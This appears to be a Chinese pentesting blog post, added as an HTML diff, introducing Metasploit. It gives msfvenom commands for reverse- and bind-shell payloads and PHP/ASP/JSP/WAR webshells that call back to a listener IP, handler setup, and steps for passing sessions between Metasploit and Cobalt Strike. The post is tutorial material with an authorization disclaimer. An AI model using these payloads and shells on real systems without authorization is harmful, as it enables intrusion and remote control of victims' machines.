@@ -1,0 +1,378 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>初识Metasploit | c0ys</title>
+<link rel="shortcut icon" href="https://c0ys.cn/favicon.ico?v=1656907333431">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://c0ys.cn/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="初识Metasploit | c0ys - Atom Feed" href="https://c0ys.cn/atom.xml">
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+<meta name="robots" content="nofollow">
+<meta name="googlebot" content="noindex, nofollow">
+<meta name="baiduspider" content="noindex, nofollow">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+
+<script>
+  fetch('https://v1.hitokoto.cn')
+    .then(response => response.json())
+    .then(data => {
+      const hitokoto = document.getElementById('hitokoto_text')
+      hitokoto.href = 'https://hitokoto.cn/?uuid=' + data.uuid
+      hitokoto.innerText = data.hitokoto
+    })
+    .catch(console.error)
+</script>
+
+<script>
+  var _hmt = _hmt || [];
+  (function() {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?93f5a2255c8226ec27177b0c251feb9f";
+    var s = document.getElementsByTagName("script")[0]; 
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+  
+    <meta name="description" content="0x01 VPS准备工作
+安装
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-fram..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://c0ys.cn">
+  <img class="avatar" src="https://c0ys.cn/images/avatar.png?v=1656907333431" alt="">
+  </a>
+  <h1 class="site-title">
+    c0ys
+  </h1>
+  <p class="site-description" id="hitokoto">
+    <a id="hitokoto_text"> 吾心吾行澄如明镜，所作所为皆为正义。</a>
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="https://c0ys.cn/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://c0ys.cn/post/talk" class="menu">
+          留言
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              初识Metasploit
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-08-28
+              </span>
+              <span>
+                7 min read
+              </span>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://bu.dusays.com/2022/03/27/6e490a20b0557.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="0x01-vps准备工作">0x01 VPS准备工作</h1>
+<h2 id="安装">安装</h2>
+<pre><code class="language-Bash">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall
+
+chmod 755 msfinstall 
+
+./msfinstall
+</code></pre>
+<h2 id="更新">更新</h2>
+<ol>
+<li>
+<p>正常来说就是执行 msfupdate 的，但是这边的话是会出现说有一个危险命令，然后导致不能更新的情况，这个时候有两种方法更新msf。</p>
+<ul>
+<li>一个是再次执行上面的安装命令；</li>
+<li>另一个就是把<code>/opt/metasploit-framework/bin/msfupdate</code>文件里面的 <code>--allow-downgrades </code>参数给去除掉，就可以更新了。</li>
+</ul>
+</li>
+<li>
+<p>不架设数据库的弊端就是，如果你进行暴力破解，得到的账号密码msf就不会入库保存了</p>
+</li>
+<li>
+<p>更新后如果找不到命令可以添加环境变量，或者<code>ln -s</code>软链接到<code>/usr/bin</code>下，但是这样不会自动补全，头疼，差点重装msf了，后面尝试下直接加入环境变量即可。</p>
+<pre><code class="language-纯文本">export PATH=&quot;/opt/metasploit-framework/bin:$PATH&quot;
+</code></pre>
+</li>
+</ol>
+<h1 id="0x02-七大模块介绍">0x02 七大模块介绍</h1>
+<pre><code class="language-纯文本">exploits    漏洞利用模块，这个模块通常是用于对某些有可能存在漏洞的目标进行漏洞利用。
+payloads    攻击载荷，exploit成功之后就会执行payload，这段payload可以是反弹代码，可以是添加用户的代码。
+auxiliary   辅助模块，该模块是用于辅助渗透的，比如端口扫描、存活探测、暴力破解。
+post        后渗透模块，该模块一般用于内网渗透。
+encoders    编码器模块，对payload进行编码加密，可绕过部分杀软软件。
+evasion     躲避模块，该模块分类下只有4个，都是为了躲避微软的限制或者是杀软的，免杀效果很一般。
+nops        空指令模块，我也没用过。
+</code></pre>
+<h1 id="0x03-payload生成反向">0x03 Payload生成(反向)</h1>
+<h2 id="生成二进制文件">生成二进制文件</h2>
+<pre><code class="language-纯文本">Linux
+msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=你的监听ip lport=你的监听端口 -f elf &gt; linux.elf
+
+Windows 反弹 payload 生成 (用于17010的dll)
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=你的监听ip lport=你的监听端口 -f dll &gt; windows.dll
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=你的监听ip lport=你的监听端口 -f exe &gt; shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=x.x.x.x lport=12345 -f psh-reflection &gt; search.ps1
+
+Mac
+msfvenom -p osx/x86/shell_reverse_tcp lhost=你的监听ip lport=你的监听端口 -f macho &gt; shell.macho
+</code></pre>
+<h2 id="生成webshell脚本">生成Webshell脚本</h2>
+<pre><code class="language-纯文本">PHP
+msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php
+cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d 'n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt;shell.php
+
+ASP
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;YourPort to Connect On&gt; -f asp &gt; shell.asp
+
+JSP
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp
+
+WAR
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war
+</code></pre>
+<h2 id="接受反向shell">接受反向shell</h2>
+<pre><code class="language-纯文本">msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp //这个就是和上面msfvenom使用的payload是一样的
+set LHOST 0.0.0.0
+set LPORT 4545
+run
+</code></pre>
+<p><strong>坑：这里payload一定要记得改！！！！不然会回弹不上！！！！</strong></p>
+<pre><code class="language-Bash">msf6 &gt; use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+</code></pre>
+<h1 id="0x04-payload生成正向">0x04 Payload生成(正向)</h1>
+<p>将上述的<code>reverse_tcp</code>换成<code>bind_tcp</code>即可。</p>
+<h2 id="生成正向paylaod">生成正向Paylaod</h2>
+<pre><code class="language-纯文本">msfvenom -p windows/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f exe &gt;/root/bind_xx.exe 
+msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f exe &gt;/root/bind_xx.exe
+msfvenom -p windows/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f dll &gt;/root/bind_xx.dll 
+msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f dll &gt;/root/bind_xx.dll
+msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f elf &gt;/root/bind_xx.elf
+msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f elf &gt;/root/bind_xx.elf
+</code></pre>
+<h2 id="正向连接shell">正向连接shell</h2>
+<pre><code class="language-纯文本">use exploit/multi/handler 
+set payload windows/x64/meterpreter/bind_tcp
+LPORT
+RHOST 为靶标的IP
+</code></pre>
+<p>用了<code>9090</code>端口启用监听后，只会接收一次数据，无论成功或者失败，好像它都不会再监听了。</p>
+<p>也就是说，如果连接失败了，那么就再运行然后再连接一次？</p>
+<blockquote>
+<p>有错请指出。</p>
+</blockquote>
+<h1 id="0x05-msf派生到cs">0x05 msf派生到cs</h1>
+<p>迁移至cs上。</p>
+<ul>
+<li><a href="https://blog.csdn.net/zzgslh/article/details/113842010">https://blog.csdn.net/zzgslh/article/details/113842010</a></li>
+<li><a href="https://www.naraku.cn/posts/104.html">https://www.naraku.cn/posts/104.html</a></li>
+</ul>
+<pre><code class="language-纯文本">use exploit/windows/local/payload_inject
+set payload windows/meterpreter/reverse_https  # 不要用64位
+set DisablePayloadHandler true   #默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一个，所以不需要在产生一个，所以这里我们设置为true
+set lhost 49.xxx               #cobaltstrike监听的ip
+set lport 443                #cobaltstrike监听的端口 
+set session 1                   #这里是获得的session的id
+exploit
+</code></pre>
+<blockquote>
+<p><strong>重点在payload的选择上，如果msf选的是tcp，那么cs也要是tcp，反之http、https皆是。</strong></p>
+</blockquote>
+<blockquote>
+<p><strong>lhost那里一定要填具体的cs的ip，我习惯性的填0.0.0.0，死活弹不上，MD，翻车⛵️到家了，血的教训。</strong></p>
+</blockquote>
+<p><code>set DisablePayloadHandler true</code>:用来禁用 Metasploit payload handler的监听，目的就是告诉 Metasploit，我们已经建立了监听器，不必再新建监听器了，避免在 Metasploit 内再起一个 handler 来服务你的 payload 连接。</p>
+<figure data-type="image" tabindex="1"><img src="https://bu.dusays.com/2022/03/27/6e490a20b0557.png" alt="" loading="lazy"></figure>
+<h1 id="0x06-cs派生到msf">0x06 cs派生到msf</h1>
+<p>场景：CS已上线主机，想把这个主机发送给MSF，生成一个MSF的Session</p>
+<p>打开MSF，开始监听</p>
+<pre><code class="language-纯文本"># 配置监听器
+msf&gt; use exploit/multi/handler
+
+# 选择Payload
+msf&gt; set payload windows/meterpreter/reverse_http # 不要用64位
+msf&gt; set lhost &lt;MSF_IP&gt;     # 不填0.0.0.0！！
+msf&gt; set lport &lt;MSF_Port&gt;   # 设置任意端口进行监听
+
+# 启动监听器
+msf&gt; run
+</code></pre>
+<blockquote>
+<p>**lhost注意不能是0.0.0.0，要具体到ip地址。**如果cs和msf是同一台服务器，msf可能会显示端口冲突，但无妨也能上线。</p>
+</blockquote>
+<p>然后在CS上设置一个Foreign监听器MSF</p>
+<figure data-type="image" tabindex="2"><img src="https://bu.dusays.com/2022/03/27/252c9e02e47fe.png" alt="" loading="lazy"></figure>
+<p>在CS中右键会话，点击<code>Spawn</code>，选择MSF的监听器，或者在CS上线主机运行：</p>
+<blockquote>
+<p>我这里由于不小心之前lhost填错了，多点了几下spawn。结果后面msf接了好几个shell。</p>
+</blockquote>
+<figure data-type="image" tabindex="3"><img src="https://bu.dusays.com/2022/03/27/1c9ac26c41de1.png" alt="" loading="lazy"></figure>
+<h1 id="其他">其他</h1>
+<p>乱码</p>
+<p><code>chcp 65001</code></p>
+
+                <blockquote>
+                  <p>声明：本博客文章所分享内容仅用于技术交流，禁止用于违法途径，所有渗透都需获取授权！否则需自行承担，本站及原作者不承担相应的后果。</p>
+                </blockquote>
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#0x01-vps%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C">0x01 VPS准备工作</a>
+<ul>
+<li><a href="#%E5%AE%89%E8%A3%85">安装</a></li>
+<li><a href="#%E6%9B%B4%E6%96%B0">更新</a></li>
+</ul>
+</li>
+<li><a href="#0x02-%E4%B8%83%E5%A4%A7%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D">0x02 七大模块介绍</a></li>
+<li><a href="#0x03-payload%E7%94%9F%E6%88%90%E5%8F%8D%E5%90%91">0x03 Payload生成(反向)</a>
+<ul>
+<li><a href="#%E7%94%9F%E6%88%90%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6">生成二进制文件</a></li>
+<li><a href="#%E7%94%9F%E6%88%90webshell%E8%84%9A%E6%9C%AC">生成Webshell脚本</a></li>
+<li><a href="#%E6%8E%A5%E5%8F%97%E5%8F%8D%E5%90%91shell">接受反向shell</a></li>
+</ul>
+</li>
+<li><a href="#0x04-payload%E7%94%9F%E6%88%90%E6%AD%A3%E5%90%91">0x04 Payload生成(正向)</a>
+<ul>
+<li><a href="#%E7%94%9F%E6%88%90%E6%AD%A3%E5%90%91paylaod">生成正向Paylaod</a></li>
+<li><a href="#%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5shell">正向连接shell</a></li>
+</ul>
+</li>
+<li><a href="#0x05-msf%E6%B4%BE%E7%94%9F%E5%88%B0cs">0x05 msf派生到cs</a></li>
+<li><a href="#0x06-cs%E6%B4%BE%E7%94%9F%E5%88%B0msf">0x06 cs派生到msf</a></li>
+<li><a href="#%E5%85%B6%E4%BB%96">其他</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://c0ys.cn/post/8yYTehX7u/">
+              <h3 class="post-title">
+                看完定向攻击的CTF题的跃跃欲试
+              </h3>
+            </a>
+          </div>
+        
+      
+        
+            <script src="https://cdn.jsdelivr.net/npm/twikoo@1.5.0/dist/twikoo.all.min.js"></script>
+
+<div id="tcomment"></div>
+<script>
+twikoo.init({
+  envId: 'https://talk.c0ys.cn',
+  el: '#tcomment'
+})
+</script> 
+          
+
+        
+
+        <div class="site-footer">
+  Powered by<a href="https://github.com/c0ys" target="_blank">c0ys</a>
+  <a class="rss" href="https://c0ys.cn/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
